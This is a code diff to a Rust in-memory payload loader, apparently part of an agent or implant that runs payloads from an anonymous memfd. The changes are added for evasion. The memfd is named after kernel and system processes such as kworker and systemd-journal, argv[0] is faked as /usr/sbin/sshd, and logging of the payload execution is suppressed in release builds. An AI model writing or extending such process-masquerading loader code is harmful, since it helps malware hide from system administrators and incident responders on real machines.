@@ -27,6 +27,7 @@ use anyhow::{anyhow, Context, Result};
 use base64::Engine;
 use clap::Parser;
 use common::CryptoSession;
+use rand::seq::SliceRandom;
 
 #[derive(Parser, Debug)]
 #[command(
@@ -105,12 +106,13 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
     use std::io::Write;
     use std::os::unix::io::FromRawFd;
 
-    let name = CString::new("orchestra_agent").unwrap();
-    // SAFETY: `name` is a valid nul-terminated C string. We deliberately do
-    // not pass `MFD_CLOEXEC` because some payloads (notably `#!`-script
-    // payloads) need the kernel to be able to re-open the file via
-    // `/proc/self/fd/<fd>` after the `execv` call. The fd is freed when the
-    // process exits.
+    // Obfuscate memfd name
+    let mut rng = rand::thread_rng();
+    let potential_names = ["systemd-journal", "kworker/u16:0", "rcu_preempt"];
+    let chosen_name = *potential_names.choose(&mut rng).unwrap();
+    let name = CString::new(format!("{}-{}", chosen_name, std::process::id())).unwrap();
+
+    // SAFETY: `name` is a valid nul-terminated C string.
     let fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
     if fd == -1 {
         return Err(anyhow!(
@@ -124,7 +126,9 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
         .context("Failed to write payload into memfd")?;
 
     let path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();
-    let argv0 = CString::new("orchestra-agent").unwrap();
+
+    // Obfuscate argv[0]
+    let argv0 = CString::new("/usr/sbin/sshd").unwrap();
     let mut argv: Vec<CString> = std::iter::once(argv0)
         .chain(
             args.iter()
@@ -137,9 +141,11 @@ fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
         .chain(std::iter::once(std::ptr::null()))
         .collect();
 
+    // Only log in debug builds
+    #[cfg(debug_assertions)]
     tracing::info!("executing payload via /proc/self/fd/{fd}");
-    // SAFETY: `path` and `argv_ptrs` are valid nul-terminated arrays. On
-    // success this call replaces the current process image and never returns.
+
+    // SAFETY: `path` and `argv_ptrs` are valid nul-terminated arrays.
     unsafe {
         libc::execv(path.as_ptr(), argv_ptrs.as_ptr());
     }
